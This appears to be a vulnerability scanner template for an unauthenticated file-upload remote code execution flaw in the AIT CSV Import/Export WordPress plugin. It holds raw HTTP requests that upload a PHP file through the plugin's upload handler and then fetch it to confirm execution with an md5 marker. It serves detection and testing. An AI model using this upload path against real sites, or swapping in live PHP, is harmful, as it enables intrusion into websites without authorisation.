id: ait-csv-import-export-rce
info:
  name: WordPress AIT CSV Import Export - Unauthenticated Remote Code Execution
  author: gy741
  severity: critical
  description: The AIT CSV Import/Export WordPress plugin allows remote attackers
    to upload and execute arbitrary PHP code without authentication or content validation.
  reference:
  - https://wpscan.com/vulnerability/10471
  - https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/wp_ait_csv_rce.rb
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 9.8
    cwe-id: CWE-434
  tags: wp-plugin,rce,fileupload,unauth,wpscan,msf,wordpress,ait-csv,wp,intrusive
  metadata:
    impact: The unauthenticated remote code execution vulnerability in the AIT CSV
      Import/Export plugin could cause significant damage to WordPress sites by allowing
      attackers to upload and execute arbitrary PHP code.
    recommendation: I highly recommend updating the AIT CSV Import/Export plugin to
      version 3.0.4 or higher to prevent unauthenticated remote code execution.
requests:
- raw:
  - 'POST /wp-content/plugins/ait-csv-import-export/admin/upload-handler.php HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Content-Type: multipart/form-data; boundary=------------------------ab360007dbae2de8


    --------------------------ab360007dbae2de8

    Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"

    Content-Type: application/octet-stream


    sep=;<?php echo md5(''ait-csv-import-export-rce'');?>


    --------------------------ab360007dbae2de8--

    '
  - 'GET /wp-content/uploads/{{randstr}}.php HTTP/1.1

    Host: {{Hostname}}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - fe394b60dc324c3bac3060d600ad4349
  - type: status
    status:
    - 200
